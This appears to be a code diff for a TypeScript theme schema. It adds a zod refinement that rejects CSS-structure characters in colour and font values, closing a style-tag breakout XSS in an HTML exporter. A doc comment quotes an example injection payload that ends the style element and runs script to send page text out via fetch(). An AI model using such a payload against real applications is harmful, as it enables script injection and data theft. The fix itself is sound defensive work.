@@ -13,9 +13,54 @@ import { z } from "zod";
  * `apply.test.ts` fails if the two drift.
  */
 
+/**
+ * Characters that let a value stop being a value.
+ *
+ * A theme is a file people share, so its contents are as untrusted as a document.
+ * `applyTheme` is safe on its own — `setProperty` goes through CSSOM, which cannot
+ * be escaped — but the HTML exporter re-derives the same tokens as *text* and drops
+ * them into a literal `<style>`. `<style>` is raw-text: the tokenizer ends it at the
+ * first `</style`, so a colour of
+ *
+ *     #fff</style><script>fetch('https://…?'+document.body.innerText)</script>
+ *
+ * exported a file that runs script at `file://` with no CSP.
+ *
+ * Checked here rather than only in the exporter because this is the boundary an
+ * imported theme crosses, and a value that cannot be represented is better rejected
+ * at the door than carried around and escaped at each use.
+ *
+ * Deliberately a character rule and not a colour grammar. The looseness is on
+ * purpose — presets are authored in `oklch()`, people paste hex out of a palette,
+ * `var()` has to keep working — and a grammar tight enough to be safe would reject
+ * valid CSS the app has always accepted. None of these characters appear in any
+ * legitimate colour or font-family:
+ *
+ *   `<` `>`  end the `<style>` element
+ *   `{` `}`  close the rule and open another
+ *   `;`      end the declaration and start another
+ *   `@`      open an at-rule (`@import` fetches)
+ *   `url(`   fetches, which also breaks the offline claim
+ *   `/*`     comment, used to swallow whatever follows
+ */
+const CSS_STRUCTURE = /[<>{};@\\]|url\s*\(|\/\*|\*\//i;
+
+/** Shared with the HTML exporter, which is the place these characters actually bite. */
+export function isSafeCssValue(value: string): boolean {
+  return !CSS_STRUCTURE.test(value);
+}
+
+const cssValue = (label: string) =>
+  z
+    .string()
+    .min(1)
+    .refine(isSafeCssValue, {
+      message: `${label} may not contain CSS structure (<>{};@, url(, or a comment)`,
+    });
+
 /** Any CSS color. Kept loose deliberately: presets are authored in oklch, users
  *  paste hex out of a palette, and both have to round-trip through an export. */
-const color = z.string().min(1);
+const color = cssValue("A colour");
 
 export const AppearanceSchema = z.enum(["light", "dark"]);
 export type Appearance = z.infer<typeof AppearanceSchema>;
@@ -47,9 +92,9 @@ export type ThemeColors = z.infer<typeof ThemeColorsSchema>;
 export const ThemeTypographySchema = z.object({
   /** A CSS font-family list. The picker offers bundled families, but any system
    *  family the user types is equally valid — hence a string, not an enum. */
-  bodyFont: z.string().min(1),
-  headingFont: z.string().min(1),
-  monoFont: z.string().min(1),
+  bodyFont: cssValue("A font family"),
+  headingFont: cssValue("A font family"),
+  monoFont: cssValue("A font family"),
   /** Base body size in px. Below 13 the serif faces lose their detail; above 28
    *  the measure stops fitting a sensible window. */
   baseSize: z.number().min(13).max(28),
